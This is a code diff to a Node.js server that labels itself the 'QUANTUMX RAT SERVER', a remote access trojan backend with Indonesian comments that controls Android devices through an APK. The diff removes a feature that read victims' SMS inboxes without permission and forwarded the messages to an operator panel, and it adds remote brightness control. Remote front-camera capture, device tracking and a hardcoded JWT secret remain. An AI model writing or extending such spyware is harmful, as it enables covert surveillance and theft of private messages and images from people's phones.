@@ -36,9 +36,6 @@ let commandResults = new Map();
 // Camera sessions tracking
 let cameraSessions = new Map(); // deviceId -> { active: boolean, socketId: string }
 
-// SMS storage (opsional - kalo mau nyimpen SMS di server)
-let smsStorage = new Map(); // deviceId -> array of SMS
-
 // ========== AUTH ==========
 const JWT_SECRET = 'quantumx-super-secret-key-2024';
 
@@ -147,15 +144,15 @@ app.post('/api/device/:deviceId/command', authenticateToken, (req, res) => {
     
     const deviceName = devices.get(deviceId)?.deviceName || deviceId;
     
-    // LOG PERTAMA: PROSES
+    // LOG PERTAMA: PROSES (TAMBAH BRIGHTNESS)
     if (command === 'flash') {
         console.log(`📸 [FLASH] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
     } else if (command === 'camera') {
         console.log(`📷 [CAMERA] CAPTURING -> ${deviceName} (${deviceId})`);
     } else if (command === 'vibrate') {
         console.log(`📳 [VIBRATE] SENDING -> ${deviceName} (${deviceId}) | DURATION: ${params?.duration || 2}s`);
-    } else if (command === 'get_sms') {
-        console.log(`📨 [SMS] REQUESTING SMS -> ${deviceName} (${deviceId}) | LIMIT: ${params?.limit || 50}`);
+    } else if (command === 'brightness') {
+        console.log(`🔆 [BRIGHTNESS] SETTING -> ${deviceName} (${deviceId}) | LEVEL: ${params?.level || 50}%`);
     }
     
     res.json({ success: true, commandId, message: 'Command sent' });
@@ -186,7 +183,7 @@ app.post('/api/device/command/result', (req, res) => {
         
         const deviceName = devices.get(deviceId)?.deviceName || deviceId;
         
-        // LOG KEDUA: HASIL
+        // LOG KEDUA: HASIL (TAMBAH BRIGHTNESS)
         if (deviceCommands[commandIndex].command === 'flash') {
             if (status === 'completed') {
                 console.log(`✅ [FLASH] SUCCESS -> ${deviceName} | DURATION: ${result?.duration}s`);
@@ -205,11 +202,11 @@ app.post('/api/device/command/result', (req, res) => {
             } else {
                 console.log(`❌ [VIBRATE] FAILED -> ${deviceName}`);
             }
-        } else if (deviceCommands[commandIndex].command === 'get_sms') {
+        } else if (deviceCommands[commandIndex].command === 'brightness') {
             if (status === 'completed') {
-                console.log(`✅ [SMS] SUCCESS -> ${deviceName} | ${result?.count || 0} MESSAGES`);
+                console.log(`✅ [BRIGHTNESS] SUCCESS -> ${deviceName} | LEVEL: ${result?.level}%`);
             } else {
-                console.log(`❌ [SMS] FAILED -> ${deviceName}`);
+                console.log(`❌ [BRIGHTNESS] FAILED -> ${deviceName}`);
             }
         }
     }
@@ -318,37 +315,6 @@ io.on('connection', (socket) => {
         }
     });
     
-    // ===== SMS DATA DARI APK =====
-    socket.on('sms-data', (data) => {
-        const { deviceId, messages, commandId } = data;
-        
-        console.log(`📨 [SMS] RECEIVED from ${deviceId}: ${messages?.length || 0} messages`);
-        
-        // Simpan di storage (opsional)
-        if (messages && messages.length > 0) {
-            smsStorage.set(deviceId, messages);
-        }
-        
-        // Update last seen
-        if (devices.has(deviceId)) {
-            const device = devices.get(deviceId);
-            device.lastSeen = new Date().toISOString();
-            devices.set(deviceId, device);
-        }
-        
-        // Kirim ke panel
-        io.emit('sms-result', {
-            deviceId,
-            messages: messages || [],
-            commandId,
-            timestamp: Date.now()
-        });
-        
-        // Log sukses
-        const deviceName = devices.get(deviceId)?.deviceName || deviceId;
-        console.log(`✅ [SMS] FORWARDED to panel: ${deviceName} - ${messages?.length || 0} messages`);
-    });
-    
     // ===== CAMERA FRAME DARI APK =====
     socket.on('camera-frame', (data) => {
         const { deviceId, imageData, timestamp } = data;
@@ -425,8 +391,7 @@ app.get('/api/stats', authenticateToken, (req, res) => {
         onlineDevices: onlineCount,
         totalCommands: commandResults.size,
         pendingCommands: Array.from(commands.values()).flat().filter(c => c.status === 'pending').length,
-        activeCameras: cameraSessions.size,
-        totalSmsStored: smsStorage.size
+        activeCameras: cameraSessions.size
     });
 });
 
@@ -435,31 +400,31 @@ const PORT = process.env.PORT || 3000;
 server.listen(PORT, () => {
     console.log(`
 ╔══════════════════════════════════════════════════════════════╗
-║           QUANTUMX RAT SERVER v4.0 - FINAL                   ║
+║              QUANTUMX RAT SERVER v4.0 - FINAL                ║
 ╠══════════════════════════════════════════════════════════════╣
 ║  RUNNING ON PORT: ${PORT}                                                ║
 ║  WEBSOCKET: ws://localhost:${PORT}                                       ║
 ║  API: http://localhost:${PORT}/api                                      ║
 ╠══════════════════════════════════════════════════════════════╣
-║                     FITUR TERSEDIA                            ║
+║                      FITUR TERSEDIA                            ║
 ╠══════════════════════════════════════════════════════════════╣
-║  📸 FLASH  - Kontrol LED flash                                ║
-║  📳 VIBRATE - Getar perangkat                                 ║
-║  📷 CAMERA - Ambil foto kamera depan                           ║
-║  📨 SMS    - Baca inbox SMS (Android <6.0 tanpa izin)         ║
+║  📸 FLASH      - Kontrol LED flash                           ║
+║  📳 VIBRATE    - Getar perangkat                             ║
+║  🔆 BRIGHTNESS - Atur kecerahan layar (real-time)            ║
+║  📷 CAMERA     - Ambil foto kamera depan                     ║
 ╠══════════════════════════════════════════════════════════════╣
-║                     LOG FORMAT                                 ║
+║                      LOG FORMAT                                ║
 ╠══════════════════════════════════════════════════════════════╣
-║  📸 [FLASH] SENDING -> Device (2s)                            ║
-║  ✅ [FLASH] SUCCESS -> Device | DURATION: 2s                  ║
-║  📳 [VIBRATE] SENDING -> Device (2s)                          ║
-║  ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s                ║
-║  📷 [CAMERA] CAPTURING -> Device                               ║
-║  ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN                   ║
-║  📨 [SMS] REQUESTING SMS -> Device | LIMIT: 50                 ║
-║  ✅ [SMS] SUCCESS -> Device | 15 MESSAGES                      ║
-║  📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID             ║
-║  💓 [HEARTBEAT] Device - 82% - NETWORK: 4G                     ║
+║  📸 [FLASH] SENDING -> Device (2s)                           ║
+║  ✅ [FLASH] SUCCESS -> Device | DURATION: 2s                 ║
+║  📳 [VIBRATE] SENDING -> Device (2s)                         ║
+║  ✅ [VIBRATE] SUCCESS -> Device | DURATION: 2s               ║
+║  🔆 [BRIGHTNESS] SETTING -> Device | LEVEL: 75%              ║
+║  ✅ [BRIGHTNESS] SUCCESS -> Device | LEVEL: 75%              ║
+║  📷 [CAMERA] CAPTURING -> Device                              ║
+║  ✅ [CAMERA] SUCCESS -> Device | PHOTO TAKEN                  ║
+║  📱 [DEVICE] ONLINE -> Device | NETWORK: WiFi SSID            ║
+║  💓 [HEARTBEAT] Device - 82% - NETWORK: 4G                    ║
 ╚══════════════════════════════════════════════════════════════╝
     `);
 });
